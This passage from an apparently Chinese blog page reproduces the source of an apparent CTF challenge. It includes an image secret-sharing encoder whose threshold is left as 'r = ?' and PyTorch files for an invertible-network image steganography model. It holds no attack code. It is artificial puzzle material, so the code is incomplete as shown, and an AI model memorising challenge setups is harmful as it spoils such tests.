class="built_in">range</span>(<span class="number">1</span>, r)]) </span><br><span class="line">        base = np.matmul(coefficients, base)    </span><br><span class="line"></span><br><span class="line">        secret_img = (img + base) % <span class="number">257</span>         </span><br><span class="line"></span><br><span class="line">        indices = np.where(secret_img == <span class="number">256</span>)[<span class="number">0</span>] </span><br><span class="line">        img_extra = indices.tolist()            </span><br><span class="line">        secret_img[indices] = <span class="number">0</span>                 </span><br><span class="line"></span><br><span class="line">        secret_imgs.append(secret_img)          </span><br><span class="line">        imgs_extra.append(img_extra)          </span><br><span class="line">    <span class="keyword">return</span> np.array(secret_imgs), imgs_extra    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">format_size</span>(<span class="params">size_bytes</span>):</span><br><span class="line">    <span class="keyword">if</span> size_bytes == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0B"</span></span><br><span class="line">    size_names = (<span class="string">"B"</span>, <span class="string">"KB"</span>, <span class="string">"MB"</span>, <span class="string">"GB"</span>, <span class="string">"TB"</span>, <span class="string">"PB"</span>, <span class="string">"EB"</span>, <span class="string">"ZB"</span>, <span class="string">"YB"</span>) </span><br><span class="line">    i = <span class="built_in">int</span>(math.floor(math.log(size_bytes, <span class="number">1024</span>))) </span><br><span class="line">    p = math.<span class="built_in">pow</span>(<span class="number">1024</span>, i)                           </span><br><span class="line">    s = <span class="built_in">round</span>(size_bytes / p, <span class="number">2</span>)                     </span><br><span class="line">    <span class="keyword">return</span> <span class="string">f"<span class="subst">{s}</span> <span class="subst">{size_names[i]}</span>"</span>                    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_size</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        size = os.path.getsize(file_path)   </span><br><span class="line">        <span class="keyword">return</span> format_size(size)            </span><br><span class="line">    <span class="keyword">except</span> OSError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f"Error: <span class="subst">{e}</span>"</span>               </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    image_path = <span class="string">"secret.png"</span>  </span><br><span class="line">    n = <span class="number">6</span>  </span><br><span class="line">    r = ?  </span><br><span class="line">    </span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"\n=== Starting image encoding process ==="</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> r &gt; n:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Error: Threshold 'r' cannot be greater than the total number 'n' of shares"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    img_flattened, shape = preprocessing(image_path) </span><br><span class="line">    secret_imgs, imgs_extra = polynomial(img_flattened, n=n, r=r) </span><br><span class="line">    to_save = secret_imgs.reshape(n, *shape)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i, img <span class="keyword">in</span> <span class="built_in">enumerate</span>(to_save):       </span><br><span class="line">        secret_img_path = <span class="string">f"secret_<span class="subst">{i + <span class="number">1</span>}</span>.png"</span></span><br><span class="line">        Image.fromarray(img.astype(np.uint8)).save(secret_img_path) </span><br><span class="line">        img_extra = <span class="built_in">str</span>(<span class="built_in">list</span>((imgs_extra[i]))).encode() </span><br><span class="line">        insert_text_chunk(secret_img_path, secret_img_path, img_extra) </span><br><span class="line">        size = get_file_size(secret_img_path) </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"<span class="subst">{secret_img_path}</span> saved."</span>, size)</span><br><span class="line"></span><br><span class="line">    end_time = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"=== Image encoding completed. Time elapsed: {:.2f} seconds ==="</span>.<span class="built_in">format</span>(end_time - start_time))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>/steg目录下的若干文件：</p>
<p>model.py:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> net <span class="keyword">import</span> simple_net</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Model</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,cuda=<span class="literal">True</span></span>):</span><br><span class="line">        <span class="built_in">super</span>(Model, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="variable language_">self</span>.model = simple_net()</span><br><span class="line">        <span class="keyword">if</span> cuda:</span><br><span class="line">            <span class="variable language_">self</span>.model.cuda()</span><br><span class="line">        <span class="comment"># init_model(self)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        out = <span class="variable language_">self</span>.model(x)</span><br><span class="line">        <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_model</span>(<span class="params">mod</span>):</span><br><span class="line">    <span class="keyword">for</span> key, param <span class="keyword">in</span> mod.named_parameters():</span><br><span class="line">        split = key.split(<span class="string">'.'</span>)</span><br><span class="line">        <span class="keyword">if</span> param.requires_grad:</span><br><span class="line">            param.data = <span class="number">0.01</span> * torch.randn(param.data.shape).cuda()</span><br><span class="line">            <span class="keyword">if</span> split[-<span class="number">2</span>] == <span class="string">'conv5'</span>:</span><br><span class="line">                param.data.fill_(<span class="number">0.</span>)</span><br></pre></td></tr></table></figure>
<p>net.py:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> model <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> block <span class="keyword">import</span> INV_block</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">simple_net</span>(nn.Module):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(simple_net, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="variable language_">self</span>.inv1 = INV_block()</span><br><span class="line">        <span class="variable language_">self</span>.inv2 = INV_block()</span><br><span class="line">        <span class="variable language_">self</span>.inv3 = INV_block()</span><br><span class="line">        <span class="variable language_">self</span>.inv4 = INV_block()</span><br><span class="line">        <span class="variable language_">self</span>.inv5 = INV_block()</span><br><span class="line">        <span class="variable language_">self</span>.inv6 = INV_block()</span><br><span class="line">        <span class="variable language_">self</span>.inv7 = INV_block()</span><br><span class="line">        <span class="variable language_">self</span>.inv8 = INV_block()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line"></span><br><span class="line">        out = <span class="variable language_">self</span>.inv1(x)</span><br><span class="line">        out = <span class="variable language_">self</span>.inv2(out)</span><br><span class="line">        out = <span class="variable language_">self</span>.inv3(out)</span><br><span class="line">        out = <span class="variable language_">self</span>.inv4(out)</span><br><span class="line">        out = <span class="variable language_">self</span>.inv5(out)</span><br><span class="line">        out = <span class="variable language_">self</span>.inv6(out)</span><br><span class="line">        out = <span class="variable language_">self</span>.inv7(out)</span><br><span class="line">        out = <span class="variable language_">self</span>.inv8(out)</span><br><span class="line">        <span class="keyword">return</span> out</span><br></pre></td></tr></table></figure>
<p>utils.py:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.init <span class="keyword">as</span> init</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> reedsolo <span class="keyword">import</span> RSCodec</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">rs = RSCodec(<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize_weights</span>(<span class="params">net_l, scale=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(net_l, <span class="built_in">list</span>):</span><br><span class="line">        net_l = [net_l]</span><br><span class="line">    <span class="keyword">for</span> net <span class="keyword">in</span> net_l:</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> net.modules():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(m, nn.Conv2d):</span><br><span class="line">                init.kaiming_normal_(m.weight, a=<span class="number">0</span>, mode=<span class="string">'fan_in'</span>)</span><br><span class="line">                m.weight.data *= scale  <span class="comment"># for residual block</span></span><br><span class="line">                <span class="keyword">if</span> m.bias <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    m.bias.data.zero_()</span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(m, nn.Linear):</span><br><span class="line">                init.kaiming_normal_(m.weight, a=<span class="number">0</span>, mode=<span class="string">'fan_in'</span>)</span><br><span class="line">                m.weight.data *= scale</span><br><span class="line">                <span class="keyword">if</span> m.bias <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    m.bias.data.zero_()</span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">isinstance</span>(m, nn.BatchNorm2d):</span><br><span class="line">                init.constant_(m.weight, <span class="number">1</span>)</span><br><span class="line">                init.constant_(m.bias.data, <span class="number">0.0</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IWT</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(IWT, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="variable language_">self</span>.requires_grad = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        r = <span class="number">2</span></span><br><span class="line">        in_batch, in_channel, in_height, in_width = x.size()</span><br><span class="line">        <span class="comment">#print([in_batch, in_channel, in_height, in_width])</span></span><br><span class="line">        out_batch, out_channel, out_height, out_width = in_batch, <span class="built_in">int</span>(</span><br><span class="line">            in_channel / (r ** <span class="number">2</span>)), r * in_height, r * in_width</span><br><span class="line">        x1 = x[:, <span class="number">0</span>:out_channel, :, :] / <span class="number">2</span></span><br><span class="line">        x2 = x[:, out_channel:out_channel * <span class="number">2</span>, :, :] / <span class="number">2</span></span><br><span class="line">        x3 = x[:, out_channel * <span class="number">2</span>:out_channel * <span class="number">3</span>, :, :] / <span class="number">2</span></span><br><span class="line">        x4 = x[:, out_channel * <span class="number">3</span>:out_channel * <span class="number">4</span>, :, :] / <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        h = torch.zeros([out_batch, out_channel, out_height, out_width]).<span class="built_in">float</span>().cuda()</span><br><span class="line"></span><br><span class="line">        h[:, :, <span class="number">0</span>::<span class="number">2</span>, <span class="number">0</span>::<span class="number">2</span>] = x1 - x2 - x3 + x4</span><br><span class="line">        h[:, :, <span class="number">1</span>::<span class="number">2</span>, <span class="number">0</span>::<span class="number">2</span>] = x1 - x2 + x3 - x4</span><br><span class="line">        h[:, :, <span class="number">0</span>::<span class="number">2</span>, <span class="number">1</span>::<span class="number">2</span>] = x1 + x2 - x3 - x4</span><br><span class="line">        h[:, :, <span class="number">1</span>::<span class="number">2</span>, <span class="number">1</span>::<span class="number">2</span>] = x1 + x2 + x3 + x4</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> h</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DWT</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(DWT, <span class="variable language_">self</span>).__init__()</span><br><span class="line">        <span class="variable language_">self</span>.requires_grad = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x01 = x[:, :, <span class="number">0</span>::<span class="number">2</span>, :] / <span class="number">2</span></span><br><span class="line">        x02 = x[:, :, <span class="number">1</span>::<span class="number">2</span>, :] / <span class="number">2</span></span><br><span class="line">        x1 = x01[:, :, :, <span class="number">0</span>::<span class="number">2</span>]</span><br><span class="line">        x2 = x02[:, :, :, <span class="number">0</span>::<span class="number">2</span>]</span><br><span class="line">        x3 = x01[:, :, :, <span class="number">1</span>::<span class="number">2</span>]</span><br><span class="line">        x4 = x02[:, :, :, <span class="number">1</span>::<span class="number">2</span>]</span><br><span class="line">        x_LL = x1 + x2 + x3 + x4</span><br><span class="line">        x_HL = -x1 - x2 + x3 + x4</span><br><span class="line">        x_LH = -x1 + x2 - x3 + x4</span><br><span class="line">        x_HH = x1 - x2 - x3 + x4</span><br><span class="line">        <span class="keyword">return</span> torch.cat((x_LL, x_HL, x_LH, x_HH), <span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">random_data</span>(<span class="params">cover,device</span>):</span><br><span class="line">    <span class="keyword">return</span> torch.zeros(cover.size(), device=device).random_(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auxiliary_variable</span>(<span class="params">shape</span>):</span><br><span class="line">    noise = torch.zeros(shape).cuda()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(noise.shape[<span class="number">0</span>]):</span><br><span class="line">        noise[i] = torch.randn(noise[i].shape).cuda()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> noise</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">computePSNR</span>(<span class="params">origin,pred</span>):</span><br><span class="line">    origin = np.array(origin)</span><br><span class="line">    origin = origin.astype(np.float32)</span><br><span class="line">    pred = np.array(pred)</span><br><span class="line">    pred = pred.astype(np.float32)</span><br><span class="line">    mse = np.mean((origin/<span class="number">1.0</span> - pred/<span class="number">1.0</span>) ** <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">if</span> mse &lt; <span class="number">1.0e-10</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">100</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span> * math.log10(<span class="number">255.0</span>**<span class="number">2</span>/mse)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_payload</span>(<span class="params">width, height, depth, text, batch = <span class="number">1</span></span>):</span><br><span class="line">    message = text_to_bits(text) + [<span class="number">0</span>] * <span class="number">32</span></span><br><span class="line"></span><br><span class="line">    payload = message</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(payload) &lt; batch * width * height * depth:</span><br><span class="line">        payload += message</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    payload = payload[:batch * width * height * depth]</span><br><span class="line">    <span class="keyword">return</span> torch.FloatTensor(payload).view(batch, depth, height, width)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">text_to_bits</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> bytearray_to_bits(text_to_bytearray(text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytearray_to_bits</span>(<span class="params">x</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> x:</span><br><span class="line">        bits = <span class="built_in">bin</span>(i)[<span class="number">2</span>:]</span><br><span class="line">        bits = <span class="string">'00000000'</span>[<span class="built_in">len</span>(bits):] + bits</span><br><span class="line">        result.extend([<span class="built_in">int</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bits])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">text_to_bytearray</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">isinstance</span>(text, <span class="built_in">str</span>), <span class="string">"expected a string"</span></span><br><span class="line">    x = zlib.compress(text.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    x = rs.encode(<span class="built_in">bytearray</span>(x))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bits_to_bytearray</span>(<span class="params">bits</span>):</span><br><span class="line">    ints = []</span><br><span class="line">    bits = np.array(bits)</span><br><span class="line">    bits = <span class="number">0</span> + bits</span><br><span class="line">    bits = bits = bits.tolist()</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bits) // <span class="number">8</span>):</span><br><span class="line">        byte = bits[b * <span class="number">8</span>:(b + <span class="number">1</span>) * <span class="number">8</span>]</span><br><span class="line">        ints.append(<span class="built_in">int</span>(<span class="string">''</span>.join([<span class="built_in">str</span>(bit) <span class="keyword">for</span> bit <span class="keyword">in</span> byte]), <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(ints)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytearray_to_text</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        text = rs.decode(x)</span><br><span class="line">        text = zlib.decompress(text[<span class="number">0</span>])</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> text.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    <span class="keyword">except</span> BaseException:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>block.py:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> initialize_weights</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dense connection</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ResidualDenseBlock_out</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, bias=<span class="literal">True</span></span>):</span><br><span class="line">        <span class="built_in">super</span>(ResidualDenseBlock_out, <span class="variable language_">self</span>).__init__()     </span><br><span class="line">        <span class="variable language_">self</span>.channel = <span class="number">12</span></span><br><span class="line">        <span class="variable language_">self</span>.hidden_size = <span class="number">32</span>   </span><br><span class="line">        <span class="variable language_">self</span>.conv1 = nn.Conv2d(<span class="variable language_">self</span>.channel, <span class="variable language_">self</span>.hidden_size, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, bias=bias)</span><br><span class="line">        <span class="variable language_">self</span>.conv2 = nn.Conv2d(<span class="variable language_">self</span>.channel + <span class="variable language_">self</span>.hidden_size, <span class="variable language_">self</span>.hidden_size, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, bias=bias)</span><br><span class="line">        <span class="variable language_">self</span>.conv3 = nn.Conv2d(<span class="variable language_">self</span>.channel + <span class="number">2</span> * <span class="variable language_">self</span>.hidden_size, <span class="variable language_">self</span>.hidden_size, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, bias=bias)</span><br><span class="line">        <span class="variable language_">self</span>.conv4 = nn.Conv2d(<span class="variable language_">self</span>.channel + <span class="number">3</span> * <span class="variable language_">self</span>.hidden_size, <span class="variable language_">self</span>.hidden_size, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, bias=bias)</span><br><span class="line">        <span class="variable language_">self</span>.conv5 = nn.Conv2d(<span class="variable language_">self</span>.channel + <span class="number">4</span> * <span class="variable language_">self</span>.hidden_size, <span class="variable language_">self</span>.channel, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, bias=bias)</span><br><span class="line">        <span class="variable language_">self</span>.lrelu = nn.LeakyReLU(inplace=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># initialization</span></span><br><span class="line">        initialize_weights([<span class="variable language_">self</span>.conv5], <span class="number">0.</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x1 = <span class="variable language_">self</span>.lrelu(<span class="variable language_">self</span>.conv1(x))</span><br><span class="line">        x2 = <span class="variable language_">self</span>.lrelu(<span class="variable language_">self</span>.conv2(torch.cat((x, x1), <span class="number">1</span>)))</span><br><span class="line">        x3 = <span class="variable language_">self</span>.lrelu(<span class="variable language_">self</span>.conv3(torch.cat((x, x1, x2), <span class="number">1</span>)))</span><br><span class="line">        x4 = <span class="variable language_">self</span>.lrelu(<span class="variable language_">self</span>.conv4(torch.cat((x, x1, x2, x3), <span class="number">1</span>)))</span><br><span class="line">        x5 = <span class="variable language_">self</span>.conv5(torch.cat((x, x1, x2, x3, x4), <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> x5</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">INV_block</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, clamp=<span class="number">2.0</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.channels = <span class="number">3</span></span><br><span class="line">        <span class="variable language_">self</span>.clamp = clamp</span><br><span class="line">        <span class="comment"># ρ</span></span><br><span class="line">        <span class="variable language_">self</span>.r = ResidualDenseBlock_out()</span><br><span class="line">        <span class="comment"># η</span></span><br><span class="line">        <span class="variable language_">self</span>.y = ResidualDenseBlock_out()</span><br><span class="line">        <span class="comment"># φ</span></span><br><span class="line">        <span class="variable language_">self</span>.f = ResidualDenseBlock_out()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">e</span>(<span class="params">self, s</span>):</span><br><span class="line">        <span class="keyword">return</span> torch.exp(<span class="variable language_">self</span>.clamp * <span class="number">2</span> * (torch.sigmoid(s) - <span class="number">0.5</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x1, x2 = (x.narrow(<span class="number">1</span>, <span class="number">0</span>, <span class="variable language_">self</span>.channels*<span class="number">4</span>),</span><br><span class="line">                  x.narrow(<span class="number">1</span>, <span class="variable language_">self</span>.channels*<span class="number">4</span>, <span class="variable language_">self</span>.channels*<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">        t2 = <span class="variable language_">self</span>.f(x2)</span><br><span class="line">        y1 = x1 + t2</span><br><span class="line">        s1, t1 = <span class="variable language_">self</span>.r(y1), <span class="variable language_">self</span>.y(y1)</span><br><span class="line">        y2 = <span class="variable language_">self</span>.e(s1) * x2 + t1</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> torch.cat((y1, y2), <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>main.py:</p>
